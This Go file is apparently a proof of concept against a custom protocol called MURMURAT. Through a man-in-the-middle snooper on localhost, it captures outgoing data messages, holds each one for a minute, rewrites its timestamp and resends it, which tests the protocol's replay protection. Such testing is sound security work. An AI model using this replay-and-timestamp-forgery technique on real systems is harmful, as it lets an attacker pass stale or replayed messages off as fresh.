package poc

import (
	"MURMURAT/poc/mitm"
	"MURMURAT/protocol"
	"MURMURAT/protocol/message"
	"bytes"
	"fmt"
	"net"
	"time"
)

func Delay() {
	serverAddr := &net.UDPAddr{
		IP:   net.IPv4(127, 0, 0, 1),
		Port: 1234,
	}

	client := mitm.NewClient(serverAddr, 0, func(session *mitm.Session) error {
		return session.SendDataMessage([]byte("Hello from client"))
	})
	client.RegisterSnooper(func(udp *mitm.UDP, buf []byte, addr net.Addr, incoming bool) bool {
		if incoming {
			return true
		}

		buffer := bytes.NewBuffer(buf)
		reader := protocol.NewReader(buffer)

		header := &message.Header{}
		if err := header.Marshal(reader); err != nil {
			fmt.Errorf("read message header: %w", err)
			return true
		}

		if header.ID == message.IDData {
			msg := &message.DataMessage{}
			if err := msg.Marshal(reader); err != nil {
				fmt.Errorf("read message data: %w", err)
				return true
			}

			go func() {
				time.Sleep(1 * time.Minute)

				msg.Timestamp = uint32(time.Now().Unix())
				_, err := udp.WritePacket(msg, addr, true)
				if err != nil {
					fmt.Errorf("write message data: %w", err)
				}
			}()
		}

		return true
	})
	server := mitm.NewServer(serverAddr.Port)

	go server.Start()
	client.Start()
}
